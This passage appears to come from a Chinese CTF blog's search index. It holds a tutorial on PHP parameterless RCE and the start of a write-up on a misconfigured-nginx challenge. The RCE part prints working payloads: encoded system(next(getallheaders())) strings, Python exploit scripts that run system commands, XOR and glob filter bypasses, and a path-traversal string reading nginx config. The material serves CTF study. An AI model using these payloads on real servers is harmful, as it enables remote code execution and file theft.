JDBC","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"php无参数RCE","path":"/2023/10/16/php-wu-can-shu-rce/","content":"0x01 前言 本文是在做CTF比赛的时候遇到了无参数的RCE，之前也没遇见过这种知识点，故此来学习一番。不过搜寻了许多文章，感觉都是无头无尾的有点混乱，所以我这里也是在 0x02 概述 传统意义上，如果我们有 eval($_GET['code']); 即代表我们拥有了一句话木马，可以进行getshell，例如 RCE指的是远程命令执行，服务器后台可以执行eval等代码执行函数，而无参数RCE指的是传参的时候被过滤，我们只能让代码执行形如a(b(c(d())))的代码 0x03 过滤场景 &lt;?php if(isset($_GET['var'])){ if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['var'])) { if (!preg_match('/et|dir|na|info|dec|oct|pi|log/i', $_GET['var'])) { eval($_GET['var']); } else { die(\"Sorry!\"); } } else{ show_source(__FILE__); } ?&gt; 关键代码 if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['var'])) { if (!preg_match('/et|dir|na|info|dec|oct|pi|log/i', $_GET['var'])) { eval($_GET['var']); } } 首先分析外层正则表达式[^\\W]+\\((?R)?\\) `^`表示取反 `\\W`代表匹配非字母、数字、下划线，等价于[^A-Za-z0-9_] 上面两点加一块，代表匹配所有字母数字下划线 `+`代表字母数字下划线匹配至少一个 `\\(` `\\)` 代表匹配括号本身 `(?R)`表示递归表达式本身 `(?R)?` 最后的`?`表示匹配1个或者0个表达式本身 综上：这个表达式其实就是匹配形如`a(b(c(d())));`的字符串，最终前面的字符串会被替换为';'，于是可以返回true而跳到下一个if语句。 内层表达式et|dir|na|info|dec|oct|pi|log 输入的字符串不能包含et、dir、na、info、dec、oct、pi、log字符串 /i表示忽略大小写，上面的黑名单字符串及时大小写也不能进行绕过 0x04 绕过方法 &lt;?php if(isset($_GET['var'])){ if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['var'])) { echo \"successful!\"; eval($_GET['var']); } else { die(\"Sorry!\"); } } else{ show_source(__FILE__); } ?&gt; 4.1 getallheaders() 这里呢返回值是数字，失败返回false 以下的测试代码是： &lt;?php if (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { eval($_GET['code']); } else{ show_source(__FILE__); } ?&gt; apache2环境下，函数返回所有请求头信息，这个是apache的函数 &lt;?php var_dump(getallheaders()); ?&gt; 如上图，其返回的是一些头部信息，我们可以抓包来自定义一些头部信息 取出我们自定义的头部信息 &lt;?php var_dump(end(getallheaders())); ?&gt; 这样一来相当于我们将http header中的hybcx变成了我们的参数，可用其进行bypass无参数函数执行，如下图 这里又针对eval的问题做了一波探讨，这里我当初疑惑为何非要在传参的地方加上eval先执行一次，代码中不就有eval吗，为何这里需要套娃（但是传参的时候没有eval就不能成功执行phpinfo），于是询问了一波GPT，首先我们要清楚eval函数的参数必须是一个可执行的PHP代码，如果只是一个单纯的字符串时会报错无法执行的。 而这里我们如果只是传入end(getallheaders())，这两个函数的意思只是单纯的取出header头信息的最后一个元素，也就是一个数组操作，而这个，而我们的正则表达式是只会匹配：满足函数调用的参数内容，也就是需要前面是一个代码执行函数的意思，这里呢当然就是eval。emmm可能我说的不清楚，这里附上GPT回答，可能会好些： 我明白你的疑虑。在PHP中，`end(getallheaders())` 不会被认为是函数调用，因为这个表达式仅返回`getallheaders()`的结果的最后一个元素，并没有直接调用函数。因此，它不包含函数调用，而是一个数组操作。 在你的示例中，确实只传入了 `end(getallheaders())` 而没有执行，因为它不满足条件检查的要求。我之前的回答中有一些混淆，我为此道歉。你的条件检查是基于正则表达式来查找包含函数调用的字符串，所以只有包含函数调用的字符串会满足条件。 如果你传入的参数中只包含 `end(getallheaders())`，它不会被认为是函数调用，因此不会执行 `eval()` 中的代码。 总之，你的示例代码要求 `$_GET['code']` 参数中包含有效的函数调用，才会执行 `eval($_GET['code'])` 中的代码。 `end(getallheaders())` 不包含函数调用，因此不满足这个要求。 回到正题，我们进一步获取RCE 非apache中间件-这里借用其他师傅的图了 4.2 get_defined_vars() &lt;?php var_dump(get_defined_vars()); ?&gt; 可以回显的全局变量 $_GET $_POST $_FILES $_COOKIE 尝试RCE 如上图我们end取到最后一个元素 eval直接执行 如果服务器 对 $_GET $_POST $_COOKIE 进行了全局过滤，可以从 $_FILES下手 import requests from io import BytesIO payload = \"system('calc.exe');\".encode('hex') files = { payload: BytesIO('hybcx') } r = requests.post('http://localhost/eval.php?var=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False) print r.content 4.3 session_id() php中对此函数的解释 可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路，即hex2bin payload： import requests payload = \"system('calc.exe');\".encode('hex') cookies = { 'PHPSESSID': payload } r = requests.get('http://localhost/eval.php?var=eval(hex2bin(session_id(session_start())));', cookies=cookies) print r.content 即可达成RCE和bypass的目的 4.4 getenv() 查阅php手册，有非常多的超全局变量 $GLOBALS $_SERVER $_GET $_POST $_FILES $_COOKIE $_SESSION $_REQUEST $_ENV 我们可以使用$_ENV，对应函数为getenv() 虽然getenv()可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题 这里可以使用方法： 效果如下： 但我们要的是数组的值，那使用如下函数 两者结合便可以展示出值 我们则可用爆破的方式获取数组中任意位置需要的值，即，可使用getenv()，并获取指定位置的恶意参数 4.5 目录操作相关 可以用相关函数进行目录遍历&amp;&amp;任意文件读取 相关函数 getcwd()当前目录 scandir() 目录扫描 dirname() 目录穿越，这里实际上就是返回到了上级目录 chdir() 更改当前目录 读取上一层的特定文件 这里没有复现成功，先借用其他师傅的图片了，感觉原因在于 这里感觉上述最后的复现很模糊不清楚，这里又找了几篇文章来学习 首先，我们可以利用getcwd()获取当前目录 ?code=var_dump(getcwd()); string(13) \"/var/www/html\" 那么怎么进行当前目录的目录遍历呢？ 这里用scandir()即可 ?code=var_dump(scandir(getcwd())); array(3) { [0]=&gt; string(1) \".\" [1]=&gt; string(2) \"..\" [2]=&gt; string(9) \"index.php\" } 那么既然不在这一层目录，如何进行目录跳转呢？ 我们用dirname()即可 ?code=var_dump(scandir(dirname(getcwd()))); array(4) { [0]=&gt; string(1) \".\" [1]=&gt; string(2) \"..\" [2]=&gt; string(14) \"flag_phpbyp4ss\" [3]=&gt; string(4) \"html\" } 那么怎么更改我们的当前目录呢？这里我们发现有函数可以更改当前目录 chdir ( string $directory ) : bool 将 PHP 的当前目录改为 directory。 所以我们这里在 dirname(getcwd()) 进行如下设置即可 chdir(dirname(getcwd())) 我们尝试读取/var/www/123 http://localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); 即可进行文件读取 0x05 相关函数总结 1. getcwd()：取得当前工作目录，成功则返回当前工作目录，失败返回 FALSE。 2. dirname()：返回路径中的目录部分，返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（’.‘），表示当前目录。否则返回的是把 path 中结尾的 /component（最后一个斜线以及后面部分）去掉之后的字符串(也就是上级目录的文件路径)。 3. chdir()：改变目录，成功时返回 TRUE， 或者在失败时返回 FALSE。 4. scandir()：列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 FALSE。如果 directory 不是个目录，则返回布尔值 FALSE 并生成一条 E_WARNING 级的错误。 5. array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。 6. array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。 7. localeconv()：返回一包含本地数字及货币格式信息的数组。而数组第一项就是 . 5.1 phpversion() phpversion()返回php版本，如7.3.5 floor(phpversion())返回7 sqrt(floor(phpversion()))返回2.6457513110646 tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615 cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491 sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156 ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46 chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回. var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))扫描当前目录 next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))返回.. floor()：舍去法取整，sqrt()：平方根，tan()：正切值，cosh()：双曲余弦，sinh()：双曲正弦，ceil()：进一法取整 5.2 crypt() chr(ord(hebrevc(crypt(phpversion()))))`返回`. hebrevc(crypt(arg))可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符 crypt()：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。 hebrevc()：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。 5.3 数组操作 end() ： 将内部指针指向数组中的最后一个元素，并输出 next() ：将内部指针指向数组中的下一个元素，并输出 prev() ：将内部指针指向数组中的上一个元素，并输出 reset() ： 将内部指针指向数组中的第一个元素，并输出 each() ： 返回当前元素的键名和键值，并将内部指针向前移动 5.4 目录操作 getchwd() ：函数返回当前工作目录。 scandir() ：函数返回指定目录中的文件和目录的数组。 dirname() ：函数返回路径中的目录部分。 chdir() ：函数改变当前的目录。 0x06 实战操作 [极客大挑战 2020]Roamphp4-Rceme 这里在buuctf打开访问 直接先dirsearch扫一波目录，这里扫出一个swp泄露，访问/.index.php.swp访问得到，不过打开文件之后发现乱码，这里用vim还原一下，发现如下代码 vim -r index.php.swp &lt;?php error_reporting(0); session_start(); //判断是否存在code的session变量，不存在的话随机生成5位md5字符串 if(!isset($_SESSION['code'])){ $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5); } if(isset($_POST['cmd']) and isset($_POST['code'])){ //判断post传入的code是否与生成的验证码相同 if(substr(md5($_POST['code']),0,5) !== $_SESSION['code']){ die('&lt;script&gt;alert(\\'Captcha error~\\');history.back()&lt;/script&gt;'); } $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5); $code = $_POST['cmd']; //判断code长度以及利用正则匹配限制code传参内容，这里几乎全过滤了，但是没有过滤取反字符，这已经在提示我们了 if(strlen($code) &gt; 70 or preg_match('/[A-Za-z0-9]|\\'|\"|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/ixm',$code)){ die('&lt;script&gt;alert(\\'Longlone not like you~\\');history.back()&lt;/script&gt;'); //这里就是常规的无参RCE题目的正则过滤表达式 }else if(';' === preg_replace('/[^\\s\\(\\)]+?\\((?R)?\\)/', '', $code)){ @eval($code); die(); } } ?&gt; 我们传入的命令中不能有以下 ， /[A-Za-z0-9]|\\'|\"|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/， 想到是无字母数字，过滤了 异或 和或，留了取反，同时我们的函数必须是无参的。 这里先上一个md5碰撞绕过验证码的脚本 import hashlib a=input(\"请输入您要爆破的md5:\") for i in range(1,200000000): x=hashlib.md5(str(i).encode(encoding='UTF-8')).hexdigest() if (x[0:5]==a): print(x) print(i) break 我们先用getallheaders函数看一下当前环境变量，当然在输入的时候要进行url编码取反，这里编码推荐bp自带的 payload： 原型为: var_dump(getallheaders()) cmd=[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()); 很好我们直接尝试修改ua头，因为这里host肯定不能修改，我们可以用next函数使指针指向下一位 原型为: system(next(getallheaders())) cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())); ua头输入ls /查看flag所在地 找到flag 原型为: system(next(getallheaders())) cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())); ua头输入cat /flag所在地flll1114gggggg 拿到flag，麻烦的点在于每次bp抓包都要重新爆破一下验证码，不过有个佬写出了exp，可以全自动，如下 import hashlib import re import requests import sys url = 'http://01bca480-d4fd-4597-a13a-a9829e724683.node4.buuoj.cn:81/' session = requests.session() # 1 md5 解码 r = session.get( url=url, ) md5_value = re.findall(r'if:substr\\(md5\\(\\$code\\),0,5\\)==(.+?)\"', r.text)[0] code = '' def md5(s): return hashlib.md5(s.encode()).hexdigest() def demd5(code):#爆破md5 for i in range(1, 9999999): if md5(str(i)).startswith(code): print('[*]code:', i) code = i break return code code = demd5(md5_value) # 2 发送payload cmd = '[~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()));' raw_data = f'code={code}&amp;cmd={cmd}' r = session.post( url=url, data=raw_data, allow_redirects=False, headers={ 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'tac /*', # 执行的代码 } ) print('[*]', r.text) # phpinfo(): [~%8F%97%8F%96%91%99%90][~%CF](); #查看shell在第几个： # var_dump(getallheaders())： [~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()); #返回shell # var_dump(next(getallheaders())): [~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]())); #执行shell # system(next(getallheaders())): [~%8C%86%8C%8B%9A%92][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]())); 这里呢在跟着wp学习一下上述payload的构造原理： 上述payload中采用!%EF的原因在于下列解释 php -r \"echo [1,2][0];\" 返回1 把他看成一个数组，然后取下标为0的内容，由于这里不能用()，所以改成了[][0]，不过0不过滤了，改成!%FF，%FF为True，加了感叹号变成了False 测试 php -r \"echo [1,2][False];\" 返回1 这里false代表的是0，true肯定就是代表1 故此[phpinfo][0]=[phpinfo][!%FF]代表的就是phpinfo，而%FF肯定不是0，但在!之下就是0了，而这里用数组去表示原因在于，题目给的第二个正则过滤了括号 这里我又对第一个正则产生了疑问，他不是会检测传入内容是否包含数字字母吗，但我传入的虽然是编码的，但显然有数字，之后测试了一番发现，如果传入类似上述payload（经过url编码的）不论是get还是post传参，都会经过url解码，而最终出现的都是不可见字符，因此完全不会被正则所匹配到。 但至于上述的~%CF或者是~%EF我还是不理解是什么意思，wp给出的解释是： 加这个[~%CF]只是因为php7的解析方式，当然换成其他的也可以例如[~%EF] 我尝试解码发现也是一些特殊字符，不过还是没有理解在此的含义，我感觉还是!%FF好理解，不过这里就先记录吧，希望日后可以有所解惑 好过了几分钟我又来了，多亏我不懈的思考终于有所解惑，这里我一直使用的hackbar进行的传参，发现总是不成功，但如果使用明文字符phpinfo就可以，接着我突然想到用bp试试 如上图，竟然成功了，接着看到刚抓包的时候发现如下图 我们cmd的内容被url编码了，而我们又是post传参，服务器是不会自动去解码的（也就是两次解码）故此我们需要bp传上去，接着我尝试换成get传参（用hackbar） 如上图成功了，这验证了我们之前的想法。nice！！！ 无参RCE构造思想： p神是根据如下代码进行的思考： &lt;?php if(isset($_GET['code'])){ $code = $_GET['code']; if(strlen($code)&gt;35){ die(\"Long.\"); } if(preg_match(\"/[A-Za-z0-9_$]+/\",$code)){ die(\"NO.\"); } eval($code); }else{ highlight_file(__FILE__); } PHP7下 php7中修改了表达式执行的顺序：http://php.net/manual/zh/migration70.incompatible.php ： PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过('phpinfo')();来执行函数，第一个括号中可以是任意PHP表达式。 所以很简单了，构造一个可以生成phpinfo这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）： (~%8F%97%8F%96%91%99%90)(); PHP5下-p神的顶尖思路（注重p神的思考方式） 好吧，这里我跟着p神是能看懂，但这里就不复现了，我直接不要脸了（bushi借用p神图片 首先p神对PHP5的getshell进行了思考： 我们使用docker run --rm -p 9090:80 -v pwd:/var/www/html php:5.6-apach来运行一个php5.6的web环境。 此时，我们尝试用PHP7的payload，将会得到一个错误： 原因就是php5并不支持这种表达方式。 p神思考： 在我在知识星球里发出帖子的时候，其实还没想到如何用PHP5解决问题，但我有自信解决它，所以先发了这个小挑战。后来关上电脑仔细想想，发现当思路禁锢在一个点的时候，你将会钻进牛角尖；当你用大局观来看待问题，问题就迎刃而解。 当然，我觉得我的方法应该不是唯一的，不过一直没人出来公布答案，我就先抛钻引玉了。 大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。 PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？ 于是他想到了php+shell打破禁锢 因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、$的系统命令来getshell？ 好像问题又回到了原点：无字母、数字、$，在shell中仍然是一个难题。 此时我想到了两个有趣的Linux shell知识点： shell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替 第一点曾在《 小密圈里的那些奇技淫巧 》露出过一角，但我没细讲。.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。 用. file执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用.来执行它了吗？ 这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。 第二个难题接踵而至，执行. /tmp/phpXXXXXX，也是有字母的。此时就可以用到Linux下的glob通配符： *可以代替0个及以上任意字符 ?可以代表1个任意字符 那么，/tmp/phpXXXXXX就可以表示为/*/?????????或/???/?????????。 但我们尝试执行. /???/?????????，却得到如下错误： 这是因为，能够匹配上/???/?????????这个通配符的文件有很多，我们可以列出来： 可见，我们要执行的/tmp/phpcjggLC排在倒数第二位。然而，在执行第一个匹配上的文件（即/bin/run-parts）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。 思路又陷入了僵局，虽然方向没错。 于是p神又开始深入理解glob通配符（翻阅linux文档） 大部分同学对于通配符，可能知道的都只有*和?。但实际上，阅读Linux的文档（ http://man7.org/linux/man-pages/man7/glob.7.html ），可以学到更多有趣的知识点。 其中，glob支持用[^x]的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉/bin/run-parts： 排除了第4个字符是-的文件，同样我们可以排除包含.的文件： 现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。 继续阅读glob的帮助，我发现另一个有趣的用法：就跟正则表达式类似，glob支持利用[0-9]来表示一个范围。 我们再来看看之前列出可能干扰我们的文件： 所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。 翻开ascii码表，可见大写字母位于@与[之间： 那么，我们可以利用[@-[]来表示大写字母： 当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。 最后，我传入的code为?&gt;&lt;?=. /???/???[@-[];?&gt;，发送数据包如下： 成功执行任意命令。 0x07 %FF以及XOR的思考 这里对于上述payload的构造仍有诸多疑问，故此搜了许多文章在此学习一波。 7.1 PHP异或流程 在PHP中，两个变量的值进行异或时，会先将两个变量的值转换为ASCII，再将ASCII转换为二进制，对两对二进制数据进行异或，异或完，再将结果转为ASCII，最后将ASCII转为字符串，即为最终结果。 7.2 异或运算法则 0&amp;0=0；1&amp;1=0；0&amp;1=1；1&amp;0=1 两个二进制数相同时，异或为0，不同为1 例：php中的字符串A和字符串? &lt;?php echo \"A\"^\"?\"; //输出：~ /* (1) A的ASCII值：65 ?的ASCII值：77 (2) 65转为二进制：1000001 90转为二进制：0111111 (3) 二进制异或结果：1111110 二进制转为ASCII:126 ASCII转为字符串：~ */ ?&gt; 利用异或制作php执行代码： &lt;?php echo (\"&lt;\"^\"a\").\"&lt;br/&gt;\"; echo (\"?\"^\"d\").\"&lt;br/&gt;\"; echo (\"p\"^\"1\").\"&lt;br/&gt;\"; echo (\"h\"^\"1\").\"&lt;br/&gt;\"; echo (\"p\"^\"1\").\"&lt;br/&gt;\"; echo (\" \"^\"a\").\"&lt;br/&gt;\"; echo (\"s\"^\"1\").\"&lt;br/&gt;\"; echo (\"y\"^\"1\").\"&lt;br/&gt;\"; echo (\"s\"^\"2\").\"&lt;br/&gt;\"; echo (\"t\"^\"1\").\"&lt;br/&gt;\"; echo (\"e\"^\"1\").\"&lt;br/&gt;\"; echo (\"m\"^\"6\").\"&lt;br/&gt;\"; echo (\"(\"^\"a\").\"&lt;br/&gt;\"; echo (\"'\"^\"a\").\"&lt;br/&gt;\"; echo (\"l\"^\"1\").\"&lt;br/&gt;\"; echo (\"s\"^\"1\").\"&lt;br/&gt;\"; echo (\"'\"^\"a\").\"&lt;br/&gt;\"; echo (\")\"^\"a\").\"&lt;br/&gt;\"; echo (\";\"^\"a\").\"&lt;br/&gt;\"; echo (\"?\"^\"b\").\"&lt;br/&gt;\"; echo (\"&gt;\"^\"c\").\"&lt;br/&gt;\"; echo \"&lt;br/&gt;\"; echo (\"]\"^\"a\").\"&lt;br/&gt;\"; echo (\"[\"^\"d\").\"&lt;br/&gt;\"; echo (\"A\"^\"1\").\"&lt;br/&gt;\"; echo (\"Y\"^\"1\").\"&lt;br/&gt;\"; echo (\"A\"^\"1\").\"&lt;br/&gt;\"; echo (\"A\"^\"a\").\"&lt;br/&gt;\"; echo (\"B\"^\"1\").\"&lt;br/&gt;\"; echo (\"H\"^\"1\").\"&lt;br/&gt;\"; echo (\"A\"^\"2\").\"&lt;br/&gt;\"; echo (\"E\"^\"1\").\"&lt;br/&gt;\"; echo (\"T\"^\"1\").\"&lt;br/&gt;\"; echo (\"[\"^\"6\").\"&lt;br/&gt;\"; echo (\"I\"^\"a\").\"&lt;br/&gt;\"; echo (\"F\"^\"a\").\"&lt;br/&gt;\"; echo (\"]\"^\"1\").\"&lt;br/&gt;\"; echo (\"B\"^\"1\").\"&lt;br/&gt;\"; echo (\"F\"^\"a\").\"&lt;br/&gt;\"; echo (\"H\"^\"a\").\"&lt;br/&gt;\"; echo (\"Z\"^\"a\").\"&lt;br/&gt;\"; echo (\"]\"^\"b\").\"&lt;br/&gt;\"; echo (\"]\"^\"c\").\"&lt;br/&gt;\"; /*输出 ] [ A Y A A B H A E T [ I F ] B F H Z ] ] &lt; ? p h p s y s t e m ( ' l s ' ) ; ? &gt; */ echo (\"AYAABHAET[IF]BFHZ]]\"^\"ad111a112116aa11aaabc\"); //没有输出，因为&lt;?php system('ls');?&gt;是代码，已经执行了，但var_dump()会显示有21个字符，或者两边都删除前两位，即可看到值 ?&gt; 制作时，^左边为我们想要的php字符，右边可设置1~9/a-z/A-Z，只要得到异或出来的值即可，之后将得到的值替换原来^左边的值，再次异或，即为你想要的php字符。如上面的\"&lt;“^“a”，异或后的值为]，再将原来的&lt;替换为]，”]\"^\"a\"的结果为&lt;，所以我们绕过时，可以使用异或来得到我们想要的值 打CTF时，若遇到白名单过滤，但没有过滤^，可以使用该方法绕过，例如：http://x.x.x.x/?page=php://input，如果目标过滤:和/时这时，就可以使用http://x.x.x.x/?page=php\"[NN\"^\"aaa\"input，这里使用\"[NN\"^\"aaa\"异或后的值即表示被过滤的://，但需要注意的是，目标不能同时都过滤单双引号 但我们可以拼凑使得异或两边的都是英文字母，这样就不需要加单或双引号例： echo (@AAA^@qwe); //输出06$ 到时候就可以也绕过单双引号，payload类似http://x.x.x.x/?page=@xx^@xx这样就可以了–不过这个操作没看懂（留着看日后能否碰撞出火花吧） 7.3 %FF的作用 这里先跟着佬的思路走一遍，payload： ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo //${_GET}{%ff}();&amp;%ff=phpinfo 看如上构造，我们接下来学习一波构造原理，这里先 上一下师傅的图片 能够接收，毕竟异或就是用不可见字符相异或表示出我们想要的字符串么， 然后为了传输，就进行一下url编码，便于传输和识别， 这里用到的关键符号就是^,用到的方法是利用不可见字符的异或来构造_GET对函数进行调用，首先是获取_GET的ascii码值 然后使用0xff分别对这几个字符进行异或操作 这里可能就会有疑问，为何必须用0xff来进行操作 ，而其他不行呢。 这里起先我也不清楚（不会思考罢了），之后看到评论区有一则回答很正解： 之所以用%ff是因为他用二进制表示为11111111。 我们知道0^1=1,1^1=1，这也就意味着我们不论传入何种字符，其转换为二进制后的数字与是上述0xff的二进制进行按位异或，最后得到的结果（也就是二进制数）一定是与原来不相同的，这时我们用得到的结果再次与0xff进行异或，得到的结果就一定是最初的字符，也就是说： \"A\"^\"0XFF\"=\"其他\",随后, \"其他\"^\"0xff\"=\"A\" 得到了字符串0xa0b8baab（均为不可见字符），将其与0xffffffff进行异或操作，就变成了_GET了，所以payload为： ?_=${%ffffffff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo url编码也是16进制的，所以0xff与%ff是同一个意思 这里上一下师傅对此的解释： 因为url也是16进制编码的，而且a^b^b = a所以下面的这个%a0%b8%ba%ab就是0xa0xb80xba0xab,连在一起就是0xa0b8baab。16进制的a0 b8 ba ab对应的就是10进制的95 71 69 84和0xff相^出来的，， 然后，，95 71 69 84对应的也就是_ G E T 也就是_GET每个字母都和0xff或者叫%ff或者叫255相异或，变成0xa0xb80xba0xab。进行bypass。然后，再次与%ff进行异或，就变成了_GET。就达成目的了， 总结： 如果我们想得到某个字符（但该字符被过滤了），那我们先令该字符与0xff进行异或，得到中间值之后，让中间值再次与0xff异或，便可以得到我们想要的某个字符 0x08 参考文章 php无参数相关 PHP无参数RCE PHP Parametric Function RCE PHP的无参数RCE 无字母数字webshell之提高篇–p神!!! 无参RCE 无参RCE–递增绕过可参考，日后遇到在学习 php异或相关 PHP异或 【芝士】%ff%ff%ff%ff%ff%ff%ff || 0xff0xff0xff0xff0xff0xff0xff 异或，~ 取反过rce 自己应该是弄明白了， wp相关 BUUCTF Web Writeup 7 [极客大挑战2020虚空复盘 官方wp [极客大挑战 2020]Roamphp 1、2、4 buuctf刷题12(zip://包含&amp; 取反+无参数rce &amp; csrf &amp; FFI扩展安全)","tags":["基本知识"],"categories":["web知识总结"]},{"title":"Web_php_wrong_nginx_config","path":"/2023/10/15/web-php-wrong-nginx-config/","content":"题目描述 无 题目解题 访问首页是一个登录框，弱口令试了没什么效果，直接扫一下目录看看 发现robots.txt，发现两个php文件，访问看看 提示配置文件有问题，估计得想办法读取一下。随后访问hack.php，但必须要登录才可以，那回到登录框再看一下，结果还是没啥思路，于是看了一眼wp发现可以访问hack.php，只不过我当时眼瞎没看到。 我们url拼接hack.php，然后bp抓包 如上图看到cookie值很可疑，猜测修改一下就可以的登录，尝试一下 页面成功有回显，然后就没有然后了，看了wp发现似乎要一个一个链接的去测试 如下图，这里我是抓包后修改cookie后放包（先放一下），随后看wp的意思他是直接点击管理中心抓包的，但实战的话肯定不清楚的，因此我们得一个个去点击测试抓包。 （不过看了wp发现这里可以查看源码或者是F12看查看器，观察哪个连接有跳转功能来针对性的抓包） 这里就直接抓了，抓了之后还是放包看有什么信息（记得修改cookie） 放了两次后发现如下图，出现可以url参数，这里可以试着读取一下之前的配置文件 读取试了试没效果（此处并没有想到被过滤了）看了wp发现…/被过滤，但我真不知道咋测试出来的。。。估计是一个个试的吧 ?file=index.php&amp;ext=和?file=index&amp;ext=php内容读取一样 payload ?file=....//....//....//....///etc/nginx/sites-enabled/site.conf&amp;ext= 成功读取，这里咱也不知道如何一键格式化代码，就cv了，接下来就只能傻傻的看wp了┭┮﹏┭┮ server { listen 8080; ## listen for ipv4; this line is default and implied listen [::]:8080; ## listen for ipv6 root /var/www/html; index index.php index.html index.htm; port_in_redirect off; server_name _; # Make site accessible from http://localhost/ #server_name localhost; # If block for setting the time for the logfile if ($time_iso8601 ~ \"^(\\d{4})-(\\d{2})-(\\d{2})\") { set $year $1; set $month $2; set $day $3; } # Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html sendfile off; set $http_x_forwarded_for_filt $http_x_forwarded_for; if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) { set $http_x_forwarded_for_filt $1???; } # Add stdout logging access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log; error_log /var/log/nginx/error.log info; location / { # First attempt to serve request as file, then # as directory, then fall back to index.html try_files $uri $uri/ /index.php?q=$uri&amp;$args; server_tokens off; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root /usr/share/nginx/html; } location ~ \\.php$ { try_files $uri $uri/ /index.php?q=$uri&amp;$args; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php/php5.6-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_index index.php; include fastcgi_params; fastcgi_param REMOTE_ADDR $http_x_forwarded_for; } location ~ /\\. { log_not_found off; deny all; } location 